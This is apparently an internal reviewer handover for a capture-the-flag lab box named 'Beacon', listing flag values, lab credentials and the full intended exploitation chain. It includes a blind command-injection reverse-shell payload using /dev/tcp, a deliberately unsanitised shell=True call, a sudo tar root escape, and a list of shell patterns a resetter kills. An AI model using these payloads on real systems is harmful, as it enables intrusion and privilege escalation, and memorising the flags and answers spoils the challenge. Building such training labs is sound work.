# Beacon — Private Technical Handover

> **Reviewers only. Contains flag values and live credentials.** Do not publish.

## 1. Manifest

| Field | Value |
|-------|-------|
| Name / slug / hostname | `beacon` |
| Author | MaryLab |
| OS / build | Ubuntu 22.04 (Docker, VM-style single host) |
| Difficulty | Medium |
| Format | Docker image `marylab/beacon:latest` (see `docker-compose.yml`) |
| Lab domains | `beacon.myl`, `git.beacon.myl` |
| Published ports | 80 (nginx), 22 (OpenSSH) |
| Internal services | PostgreSQL 14 (`127.0.0.1:5432`), gunicorn site app (`127.0.0.1:8001`), gunicorn RepoForge (`127.0.0.1:8002`) |
| Runtime internet | none required (everything vendored) |

## 2. Flags

| Flag | Path | Owner / mode | Value |
|------|------|--------------|-------|
| user | `/home/maya/user.txt` | `root:maya` `0640` | `014dedcc0de6f769801aa5c8117be764` |
| root | `/root/root.txt` | `root:root` `0640` | `6d66ce112a162d9911717305f5a38c39` |

`user.txt` is `0640 root:maya` so the `beacon-ops` foothold account cannot read
it — reaching `maya` is the objective of the middle of the chain.

## 3. Accounts & credentials

| Context | Username | Secret | Where it lives |
|---------|----------|--------|----------------|
| Ops Console (web) | `devops` | `Sandb0x!Ops2020` | leaked in git history (`config/dev.env`); live in `/etc/beacon/beacon.env` |
| Dev service token | — | `blcn_live_ShdVlf5MHJKmgDveWWZobb5WIioAHL4r` | same `dev.env` leak (decoy credential / realism) |
| PostgreSQL role | `beacon_ops` | `0ps-r3ader-9c2f` | `/etc/beacon/beacon.env` (`DATABASE_URL`) |
| UNIX user (user flag) | `maya` | `Beacon-Deploy-7F2a!` | `ops.integration_credentials` table (service `ssh-deploy`); also maya's login password |
| root | `root` | randomised at build (`chpasswd`), not part of the path | — |

`beacon-ops` is a service account (uid 1001, `/usr/sbin/nologin`) that runs the
site + Ops Console and owns the maintenance cron. `maya` is uid 1100.

## 4. Intended attack chain

1. **Recon.** `beacon.myl` marketing site states the project is open source,
   started **June 2020**, and links (header "Source", footer, `/about`,
   `/changelog`) to `git.beacon.myl/lumen-systems/beacon`.
2. **Repo enumeration.** RepoForge `/explore` lists **20** repositories. The real
   project is pinned by two corroborating clues: it is named in the site
   footer/README **and** its earliest commits are June 2020. Decoys include an
   archived 2018 prototype (`beacon-legacy`) and a recent fork (`daniel/beacon`)
   so the owner/date disambiguate it. Found by deduction or by secret-scanning,
   never by guessing.
3. **Git history leak.** `git clone http://git.beacon.myl/lumen-systems/beacon.git`.
   Commit `94e66ec` ("Add local dev config for the ops console", 2020-06-22)
   adds `config/dev.env` with the `devops` credentials; commit `2562d74`
   ("Move ops console creds to env vars; drop committed dev config", 2020-08-10)
   removes it, but it survives in history. Recoverable with `git log -p` /
   `git show 94e66ec`, and caught by gitleaks/trufflehog (the
   `BEACON_OPS_PASSWORD=` assignment and the `blcn_live_` token both trip
   standard rules). Also viewable in the RepoForge UI commit diff page.
4. **Dev panel login.** `devops` / `Sandb0x!Ops2020` authenticates to the Ops
   Console at `http://beacon.myl/ops`.
5. **Blind command injection.** `/ops/diagnostics` runs a "connectivity probe":
   `subprocess.Popen("ping -c 1 -W 2 " + target, shell=True, ...)` with no
   sanitisation and **no command output returned** to the browser. Out-of-band
   exploitation via a reverse shell:
   `target = x; bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"`.
   Lands as `beacon-ops`.
6. **The 60-second twist.** `beacon-ops`'s crontab runs
   `/opt/beacon/maintenance/reset_sandbox.sh` every minute. It `pkill`s stray
   interactive/reverse shells owned by `beacon-ops` (patterns include
   `bash -i`, `/dev/tcp/`, `nc -e`, `python3 -c`, …) and deletes `beacon-ops`
   files under `/tmp /dev/shm /var/tmp`, then appends a heartbeat to
   `/var/log/beacon/reset.log`. The player must NOT race it: within a ~60 s
   window they enumerate (`crontab -l`, `ps aux`, `/var/log/beacon/reset.log`,
   `cat /opt/beacon/maintenance/reset_sandbox.sh`) and disable it. `beacon-ops`
   owns both the crontab and the script, so any of: `crontab -r`, commenting the
   line via `crontab -e`, or `chmod -x` the script works.
7. **Database → user.** The DB **persists** across resets (the job only touches
   the service + dropped files). `cat /etc/beacon/beacon.env` gives the
   `beacon_ops` PostgreSQL credential:
   `PGPASSWORD=0ps-r3ader-9c2f psql -h 127.0.0.1 -U beacon_ops -d beacon`.
   `SELECT service,username,secret,note FROM ops.integration_credentials;`
   reveals the `ssh-deploy` row: `maya` / `Beacon-Deploy-7F2a!`. That is also
   maya's UNIX password → `su maya` or `ssh maya@TARGET`. Read
   `/home/maya/user.txt`.
8. **Privesc → root.** `sudo -l` as maya:
   `(root) NOPASSWD: /usr/bin/tar`. GTFOBins tar escape:
   ```sh
   sudo tar -cf /dev/null /dev/null --checkpoint=1 \
        --checkpoint-action=exec='/bin/sh -c "sh"'
   ```
   (or `--checkpoint-action=exec=sh`). Root shell → `cat /root/root.txt`.

## 5. Processes & automation

* Services started by `/usr/local/bin/entrypoint.sh` (PID 1 via `tini`):
  postgresql (`pg_ctlcluster`), sshd, cron, nginx, RepoForge gunicorn (as
  `www-data`), site+Ops gunicorn (as `beacon-ops`).
* Automation: `beacon-ops` crontab → `reset_sandbox.sh` every minute
  (installed at build via `crontab -u beacon-ops`).
* Firewall: none inside the container; only 80/22 are published by compose.

## 6. Source of custom components

| Component | Path in repo | Notes |
|-----------|--------------|-------|
| Marketing site + Ops Console (blind cmdi) | `src/marketing/` | Flask; vuln in `ops_diagnostics()` |
| RepoForge code host UI | `src/repoforge/` | Flask over bare git repos |
| Repo history + leak + decoys | `seed/build_repos.sh` | backdated commits; 20 repos |
| DB schema / seed / grants | `build/db/` | `ops.integration_credentials` holds maya's secret |
| 60 s resetter + crontab | `build/maintenance/` | the twist |
| nginx vhosts + dumb-HTTP git | `build/nginx/beacon.conf` | — |

## 7. Version pins / reasons

* `ubuntu:22.04` base — stable LTS; ships PostgreSQL 14, Python 3.10. (The
  original design targeted `debian:12`; switched to Ubuntu only so the image
  builds inside the restricted MaryLab build network, which allows the Ubuntu
  archive. Behaviour is identical.)
* Python deps pinned in `build/requirements.txt` (Flask 3.0.3, gunicorn 22.0.0,
  setproctitle 1.3.3, Markdown 3.7). `setproctitle` makes the gunicorn master
  titles deterministic so the resetter's `pgrep` is reliable.
* No CVE is used; every weakness is a deliberate custom misconfiguration, which
  is appropriate for a Medium box and keeps the build reproducible with no
  runtime internet.

## 8. Verification checklist (all confirmed on a live build)

- [x] Marketing site + `/ops` + `/status` render (HTTP 200); footer/README name the repo and June 2020.
- [x] RepoForge lists 20 repos; correct repo identifiable by name + June-2020 earliest commit.
- [x] `git clone` over dumb HTTP recovers `config/dev.env` from history (`git log -p`); gitleaks-detectable pattern present; visible in UI commit diff.
- [x] `devops`/`Sandb0x!Ops2020` logs into the Ops Console.
- [x] Blind cmdi executes as `beacon-ops` (OOB), no output on screen; reverse shell lands.
- [x] Cron fires every minute; resetter kills live `bash -i`/reverse-shell procs and deletes dropped files; `crontab -l` shows it; `crontab -r` disables it.
- [x] `beacon-ops` reads `beacon.env`; `beacon_ops` psql role reads `ops.integration_credentials` → maya's password; DB survives a reset.
- [x] `su maya` and `ssh maya@TARGET` both succeed with the recovered password; user flag readable by maya, not by beacon-ops.
- [x] `sudo -l` shows NOPASSWD tar; GTFOBins tar escape yields uid=0 and root flag.
- [x] Flags are 32 hex, correct owner/mode; no stray copies anywhere else on disk; `beacon-ops` has no sudo shortcut.
